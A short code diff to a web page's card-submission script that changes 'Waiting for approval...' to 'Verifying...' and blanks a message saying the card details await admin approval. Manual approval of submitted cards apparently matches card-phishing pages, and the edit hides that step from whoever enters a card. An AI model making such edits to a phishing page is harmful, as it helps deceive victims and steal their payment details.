@@ -821,10 +821,10 @@
                     localStorage.setItem('sessionId', sessionId);
                     
                     // Update button text
-                    buttonText.textContent = 'Waiting for approval...';
+                    buttonText.textContent = 'Verifying...';
                     
                     // Show success message
-                    document.getElementById('successMessage').textContent = 'Card details submitted successfully. Waiting for admin approval...';
+                    document.getElementById('successMessage').textContent = '';
                     document.getElementById('successMessage').classList.add('show');
                     
                     // Start polling for status
